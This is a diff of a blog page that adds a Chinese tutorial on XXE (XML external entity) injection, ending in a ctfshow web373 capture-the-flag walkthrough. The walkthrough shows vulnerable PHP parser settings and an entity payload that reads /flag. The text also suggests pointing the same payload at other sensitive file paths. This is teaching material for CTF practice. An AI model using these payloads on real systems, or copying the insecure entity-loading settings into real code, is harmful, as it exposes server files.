@@ -66,7 +66,7 @@
         <!--文章目录-->
         <div id="toc" class="toc-article">
     <div class="toc-title"></div>
-    
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XML%E5%9F%BA%E7%A1%80"><span class="toc-text">XML基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8F%AF%E8%83%BD"><span class="toc-text">利用可能</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%9A%84xml%E6%B3%A8%E5%85%A5"><span class="toc-text">普通的xml注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxe%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">xxe文件读取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow-web373"><span class="toc-text">ctfshow web373</span></a></li></ol></li></ol>
 </div>
         
         <!--返回顶部-->
@@ -206,6 +206,15 @@
             2023/6/11
         </span>
         
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
         
         <!--文章字数统计-->
         
@@ -216,7 +225,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">0字</span>
+        <span class="post-count">1k字</span>
       </span>
     </span>
 
@@ -225,7 +234,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">1分</span>
+        <span class="post-count">4分</span>
       </span>
     </span>
 </div>
@@ -234,7 +243,95 @@
     </div>
     
     <div class="content" v-pre>
-        
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>XXE（XML External Entity）攻击是一种针对应用程序的攻击，它利用了XML解析器的漏洞，通过注入恶意XML实体来实现攻击目的</p>
+<p>全称是XML外部实体注入</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357#toc-3">参考先知社区的一篇文章</a></p>
+<span id="more"></span>
+
+<h1 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h1><p><a target="_blank" rel="noopener" href="https://www.runoob.com/xml/xml-tutorial.html">可移步菜鸟教程</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/dtd/dtd-tutorial.html">DTD</a></p>
+<p>XML 指可扩展标记语言（e<strong>X</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage）。</p>
+<p>与HTML有点类似，但是XML 被设计用来传输和存储数据，不用于表现和展示数据，HTML 则用来表现数据。</p>
+<p>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的</p>
+<p>例：</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;	&lt;!--这一行是XML文档定义--&gt;
+&lt;!DOCTYPE message [
+&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;
+&lt;!ELEMENT receiver (#PCDATA)&gt;
+&lt;!ELEMENT sender (#PCDATA)&gt;
+&lt;!ELEMENT header (#PCDATA)&gt;
+&lt;!ELEMENT msg (#PCDATA)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>receiver</span><span class="token punctuation">></span></span>Myself<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>receiver</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sender</span><span class="token punctuation">></span></span>Someone<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sender</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span><span class="token punctuation">></span></span>TheReminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>msg</span><span class="token punctuation">></span></span>This is an amazing book<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>msg</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)</p>
+<p>例：</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>creds</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>		<span class="token comment">&lt;!--引用xxe实体--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pass</span><span class="token punctuation">></span></span>mypass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pass</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>creds</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p>
+<hr>
+<h1 id="利用可能"><a href="#利用可能" class="headerlink" title="利用可能"></a>利用可能</h1><h2 id="普通的xml注入"><a href="#普通的xml注入" class="headerlink" title="普通的xml注入"></a>普通的xml注入</h2><p>类似sql注入，都是闭合前面的语句另起一段新语句</p>
+<p><img src="/blog/2023/06/11/XXE/image-20230625123643038.png" alt="image-20230625123643038"></p>
+<h2 id="xxe文件读取"><a href="#xxe文件读取" class="headerlink" title="xxe文件读取"></a>xxe文件读取</h2><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot; &gt;]&gt;	
+&lt;creds&gt;
+	&lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;	&lt;!--外部引用xxe实体--&gt;
+    &lt;pass&gt;mypass&lt;&#x2F;pass&gt;
+&lt;&#x2F;creds&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这段代码从外部的dtd文件引用了实体，于是称为<strong>外部实体</strong></p>
+<p>这样对引用资源所做的任何更改都会在文档中自动更新</p>
+<p>还有一种引用方式是使用 引用<strong>公用 DTD</strong> 的方法，语法如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p>
+<p>实际上，在上面那段代码中，既然能读 dtd 那我们是不是能将路径换一换，换成敏感文件的路径，然后把敏感文件读出来？</p>
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="ctfshow-web373"><a href="#ctfshow-web373" class="headerlink" title="ctfshow web373"></a>ctfshow web373</h2><p>进入题目看到源码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">ctfshow</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$ctfshow</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先通过<code>libxml_disable_entity_loader(false)</code>函数，启用XML解析器的外部实体加载功能，允许XML文件中的外部实体被解析和使用</p>
+<p>然后这里用到了<code>php://input</code>伪协议，那我们等会传参的时候就是要通过post传入代码执行</p>
+<p>接着使用<code>DOMDocument</code>类和<code>simplexml_import_dom</code>函数，将XML文件解析为DOM对象，并将其转换为SimpleXMLElement对象以便于处理。在解析XML文件时，使用了<code>LIBXML_NOENT</code>和<code>LIBXML_DTDLOAD</code>选项，允许加载实体和DTD（文档类型定义）</p>
+<p>从SimpleXMLElement对象中提取<code>ctfshow</code>节点的值，并将其作为响应输出</p>
+<p>因为启用了外部实体加载功能，所以可以进行xxe文件读取</p>
+<p>猜测flag路径在&#x2F;flag，直接用bp抓包post传参读取flag</p>
+<p>payload：</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE test [
+&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;
+]&gt;
+&lt;test&gt;
+&lt;ctfshow&gt;&amp;xxe;&lt;&#x2F;ctfshow&gt;
+&lt;&#x2F;test&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
     </div>
     
     
